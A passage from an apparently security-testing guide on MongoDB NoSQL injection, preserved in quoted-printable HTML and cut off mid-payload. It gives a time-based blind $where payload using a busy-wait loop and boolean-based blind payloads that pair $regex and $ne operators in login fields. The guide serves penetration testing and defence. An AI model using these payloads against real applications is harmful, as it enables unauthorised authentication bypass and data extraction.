blind-injection-where-scripting-is-enabled"><h4>Time-based blind injection,=
 where scripting is enabled</h4><pre contenteditable=3D"false" class=3D"w-c=
ode-block" style=3D"display:block;overflow-x:auto;background:#2b2b2b;color:=
#f8f8f2;padding:0.5em"><code class=3D"language-plaintext" style=3D"white-sp=
ace:pre-wrap"><span><span>{"$where": "var d =3D new Date(); do { var c =3D =
new Date(); } while (c - d &lt; 5000); return true;"}</span></span></code><=
/pre><p>A CPU-bound wait loop like this is more portable across MongoDB ver=
sions than relying on a <code>sleep()</code> helper, since MongoDB=E2=80=99=
s server-side JavaScript environment doesn=E2=80=99t expose one by default.=
 Out-of-band exfiltration through <code>$where</code>, sending data to an e=
xternal HTTP endpoint from inside the JavaScript context, shows up in older=
 writeups and CTF material, but current MongoDB=E2=80=99s server-side JavaS=
cript sandbox doesn=E2=80=99t expose networking primitives like <code>XMLHt=
tpRequest</code>, so treat that variant as a legacy avenue rather than some=
thing to test for on a modern deployment.</p></div></div><div id=3D"blind-m=
ongodb-injection" style=3D"scroll-margin-top: 8rem;"><h3>Blind MongoDB inje=
ction</h3><p>When the application doesn=E2=80=99t return query results or e=
rror messages directly, use timing or content-based comparisons instead.</p=
><div id=3D"boolean-based-blind-comparing-a-likely-true-condition-against-a=
-likely-false-one"><h4>Boolean-based blind comparing a likely-true conditio=
n against a likely-false one</h4><pre contenteditable=3D"false" class=3D"w-=
code-block" style=3D"display:block;overflow-x:auto;background:#2b2b2b;color=
:#f8f8f2;padding:0.5em"><code class=3D"language-javascript" style=3D"white-=
space:pre-wrap"><span><span>username[$regex]=3Dadmin&amp;password[$ne]=3Dxy=
z
</span></span><span>username[$regex]=3Ddoesnotexist99999&amp;password[$ne]=
